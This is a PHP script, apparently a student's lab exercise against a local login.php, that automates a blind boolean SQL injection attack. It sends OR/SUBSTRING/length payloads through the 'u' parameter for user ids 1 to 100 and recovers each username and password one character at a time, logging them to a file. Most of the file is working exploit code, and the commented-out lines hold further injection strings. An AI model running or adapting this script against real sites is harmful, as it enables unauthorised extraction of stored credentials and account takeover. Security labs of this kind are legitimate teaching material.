<?php
//$url="http://localhost/lab09/login.php?u=\"%20or%20username%20=%20%27admin%27%20--%20";
//$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20SUBSTRING(username,1,1)%20=%20%27a%27%20--%20"; // Celui fonctionne
//$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20AND%20SUBSTRING(password,1,1)%20=%20%271%27%20--%20"




//Cette partie est pour l'username "brute force"




/*foreach(range(32,126)  as $i) 
{ 
    echo "The character equivalent of  
                 ASCII value of ", $i, " is "; 
    echo chr($i), "\n"; 
} */


$monfichier = fopen('outputSQL.txt', 'r+');
fseek($monfichier, 0); 
//Marche admin final
for($id = 1; $id <= 100; $id++){
	print "\n";
	fputs($monfichier, "\n");
	fputs($monfichier, "\n");
	$size = 0;
	while ($size < 40)
	{
		$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%20$id%20and%20length(username)%20=%20$size--%20";
		$result = file_get_contents($url);
		if (strpos($result, 'cat') !== false) {
			echo "\n";

			break;
		}else{
		//echo "\n";
		//echo "nope";
		}

		$size++;
	}

	echo "username: ";
	fputs($monfichier, "username: ");
	//print $size;


	for ($i = 1; $i <= $size; $i++) {
		foreach (range('a', 'z') as $letter){
         //echo "$letter \n";
			$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%20$id%20and%20SUBSTRING(username,$i,1)%20=%20%27$letter%27%20--%20";
			$result = file_get_contents($url);
			if (strpos($result, 'cat') !== false) {

				print "$letter";
				fputs($monfichier, $letter);
				break;
			}else{

			}
		}   
	}


	$sizepwd = 0;
	while ($sizepwd < 40)
	{
		$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%20$id%20and%20length(password)%20=%20$sizepwd--%20";
		$result = file_get_contents($url);
		if (strpos($result, 'cat') !== false) {
			

			break;
		}else{
		//echo "\n";
		//echo "nope";
		}

		$sizepwd++;
	}
	echo "\n";
	fputs($monfichier, "\n");
	echo 'password: ';
	fputs($monfichier, "password: ");
//print $sizepwd;

	$letter = "";
	for ($i = 1; $i <= $sizepwd; $i++) {
		foreach (range(33,127) as $character){
			$letter = chr($character);
			if($letter == '+'){
				$letter = "%2B";
			}
			
			//$letter = mb_convert_encoding (chr($character), 'UTF-8', 'ISO-8859-1');
         	//echo "$letter \n";

			$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%20$id%20and%20SUBSTRING(password,$i,1)%20=%20%27$letter%27%20--%20";
			$result = file_get_contents($url);
			if (strpos($result, 'cat') !== false) {
				if ($letter == "%2B") {
					$letter = "+";
				}
				print "$letter";
				fputs($monfichier, $letter);
				break;
			}else{

			}
		}   
	}
}
















/*Ceci marche
$size = 0;
while ($size < 25)
{
    $url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20length(username)%20=%20$size--%20";
	$result = file_get_contents($url);
	if (strpos($result, 'cat') !== false) {
		echo "\n";
		
		break;
	}else{
		//echo "\n";
		//echo "nope";
	}

	$size++;
}

echo 'size is ';
print $size;

for ($i = 1; $i <= $size; $i++) {
    echo "The number is: $i <br>";
} 
*/









/*$result = file_get_contents($url);

print($result);


if (strpos($result, 'cat') !== false) {
	echo "\n";
	echo 'true';
}else{
	echo "\n";
	echo "nope";
}*/
fclose($monfichier);
echo "\n";

?>